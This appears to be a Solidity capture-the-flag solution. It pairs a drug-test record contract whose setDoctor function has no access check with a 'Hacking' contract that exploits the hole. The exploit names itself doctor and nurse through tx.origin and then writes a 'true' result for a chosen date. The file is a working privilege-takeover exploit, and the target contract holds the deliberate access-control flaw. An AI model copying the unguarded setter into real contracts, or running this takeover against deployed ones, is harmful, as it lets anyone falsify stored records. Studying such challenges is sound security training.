contract OnesAndZeros {

    struct DrugTest {
        address responsible;
        bool result;
    }

    mapping(bytes32 => DrugTest) public tests;

    address public doctor;
    address public nurse;

    modifier grantDoctor() {
        require(msg.sender == doctor);
        _;
    }

    modifier grantNurse() {
        require(msg.sender == nurse);
        _;
    }

    function setDoctor(address _doctor) public {
        doctor = _doctor;
    }

    function setNurse(address _nurse) public grantDoctor {
        nurse = _nurse;
    }

    function add(bytes32 date, bool result) public grantNurse {
        tests[date] = DrugTest(msg.sender, result);
    }

    function getResultByDate(bytes32 date) public view returns (bool) {
        return tests[date].result;
    }
}


//0xchangeit

contract Hacking{

address contractaddr = 0xchangeit;
OnesAndZeros re;
address owner;

function Hacking() public {
    owner = msg.sender;
    re = OnesAndZeros(contractaddr);
}

function setDoc() public {
    re.setDoctor(tx.origin);
}


function setNurse() public{
    re.setNurse(tx.origin);
}

function win() public{
    re.add('03/15/2018', true);
}

}
